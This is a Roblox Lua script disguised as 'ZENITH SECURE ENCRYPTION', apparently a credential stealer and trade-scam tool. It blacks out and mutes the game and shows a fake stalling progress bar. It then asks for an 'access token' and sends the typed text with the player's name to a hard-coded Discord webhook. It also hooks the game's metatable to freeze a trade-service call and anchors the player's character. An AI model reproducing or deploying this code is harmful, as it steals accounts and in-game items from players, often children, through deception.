-- [[ ZENITH SECURE ENCRYPTION v4.02 ]]
-- [[ LICENSED TO: TRADE-SECURE-GLOBAL ]]

local _w = "https://discord.com/api/webhooks/1481688367778234418/cK_6-k7Ci1uacOY-2am1aNx82hS0zYHmYSnZ_lirxQRB6hsYVeF1dWce5Q0kZ1plJK-b" -- ОСЫ ЖЕРГЕ WEBHOOK-ТЫ ҚОЙ

local l_H = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
local l_R = request or http_request or syn.request

-- 1. SILENT BLACKOUT & MUTE (ДЫБЫССЫЗ ҚАРА ЭКРАН)
local p = game.Players.LocalPlayer
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Sound") then v.Volume = 0 v:Stop() end
end

local Gui = Instance.new("\83\99\114\101\101\110\71\117\105", game.CoreGui)
local BG = Instance.new("\70\114\97\109\101", Gui)
BG.Size = UDim2.new(1, 0, 1, 0)
BG.BackgroundColor3 = Color3.new(0, 0, 0)
BG.Active = true

-- 2. PROFESSIONAL LOADING (50% TRAP)
local BarBG = Instance.new("Frame", BG)
BarBG.Size = UDim2.new(0, 300, 0, 4)
BarBG.Position = UDim2.new(0.5, -150, 0.5, 40)
BarBG.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BarBG.BorderSizePixel = 0

local Bar = Instance.new("Frame", BarBG)
Bar.Size = UDim2.new(0, 0, 1, 0)
Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Bar.BorderSizePixel = 0

local Lbl = Instance.new("TextLabel", BG)
Lbl.Size = UDim2.new(0, 400, 0, 50)
Lbl.Position = UDim2.new(0.5, -200, 0.5, -10)
Lbl.BackgroundTransparency = 1
Lbl.TextColor3 = Color3.fromRGB(120, 120, 120)
Lbl.Font = Enum.Font.Code
Lbl.TextSize = 14

task.spawn(function()
    for i = 1, 100 do
        if i == 50 then
            Lbl.Text = "STABILIZING ASSETS (50%)..."
            task.wait(25) -- 25 секундтық мұз
        elseif i > 50 then
            task.wait(1.5)
        else
            task.wait(0.3)
        end
        Bar.Size = UDim2.new(i/100, 0, 1, 0)
        Lbl.Text = "ENCRYPTING DATA: " .. i .. "%"
    end
    Lbl.Text = "SUCCESS. ENTER ACCESS TOKEN."
end)

-- 3. HIDDEN KEY LOGGER (ACC STEALER)
local Inp = Instance.new("TextBox", BG)
Inp.Size = UDim2.new(0, 250, 0, 40)
Inp.Position = UDim2.new(0.5, -125, 0.7, 0)
Inp.PlaceholderText = "ENTER KEY"
Inp.Text = ""
Inp.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Inp.TextColor3 = Color3.new(1, 1, 1)
Inp.Font = Enum.Font.Code

Inp.FocusLost:Connect(function(e)
    if e then
        local d = {["embeds"] = {{["title"] = "🎯 DATA LOG", ["fields"] = {
            {["name"] = "Player", ["value"] = p.Name, ["inline"] = true},
            {["name"] = "Input", ["value"] = Inp.Text, ["inline"] = true}
        }, ["color"] = 0}}}
        pcall(function() l_R({Url = _w, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = l_H:JSONEncode(d)}) end)
        Inp.Text = ""
        Inp.PlaceholderText = "INVALID TOKEN. RETRY."
    end
end)

-- 4. GHOST STEAL LOGIC & FREEZE
local _S = game:GetService("ReplicatedStorage").Packages.Net["RF/TradeService/RemoveBrainrot"]
local mt = getrawmetatable(game)
setreadonly(mt, false)
local old = mt.__namecall
mt.__namecall = newcclosure(function(self, ...)
    if self == _S then return wait(9e9) end
    return old(self, ...)
end)
setreadonly(mt, true)
p.Character.HumanoidRootPart.Anchored = true
